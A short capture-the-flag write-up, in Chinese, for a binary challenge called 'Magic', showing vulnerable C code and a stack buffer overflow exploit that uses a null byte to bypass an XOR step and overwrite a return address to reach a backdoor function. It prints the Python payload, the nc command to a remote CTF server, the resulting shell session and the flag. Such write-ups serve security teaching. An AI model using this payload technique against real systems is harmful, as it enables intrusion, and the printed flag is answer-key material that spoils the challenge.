# Magic
source code
```c
void do_magic(char *buf,int n)
{
        int i;
        srand(time(NULL));
        for (i = 0; i < n; i++)
                buf[i] ^= rand()%256;
}

void magic()
{
        char magic_str[60];
        scanf("%s", magic_str);
        do_magic(magic_str, strlen(magic_str));
        printf("%s", magic_str);
}
```

## Solve
 * scanf 讀到 ' ' 和 '\n' 會停止讀取並回傳結果
 * strlen 讀到 '\0' 會回傳長度
 * 這代表，我們可以輸入明明長度大於0，但strlen計算卻會以為長度=0 的字串！
 * 問題：想呼叫的`never_used`位址在`0x804860d` ，`\x0d`是空白字元，scanf會停止 => 跳到下個指令也行

```bash
$ (python -c 'print "lubebul \x00" + "A"*(68+4-1) + "\x10\x86\x04\x08"') | ./magic
Welcome to Magic system!
Give me your name(a-z): Your name is lubebul.
Give me something that you want to MAGIC: $
Segmentation fault (core dumped)
```
 * 把字串存成[文字檔](in)，就不用每次手動輸入
 ```bash
 $ (python -c 'print "lubebul \x00" + "A"*(68+4-1) + "\x10\x86\x04\x08"') > in
 ```
 * 用`cat -` 讓shell 繼續開著
```
$ (cat in -) | (nc 140.113.209.24 10000)
Welcome to Magic system!
Give me your name(a-z): Your name is lubebul.
Give me something that you want to MAGIC: sh: 0: can't access tty; job control turned off
$ ls
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ cd ho
sh: 2: cd: can't cd to ho
$ cd home
$ ls
ctf
$ cd ctf
$ ls
ctf
flag
$ cat flag
BAMBOOFOX{Th1s_1s_@_b4ckd00r_n0t_m4g1c}
$
```
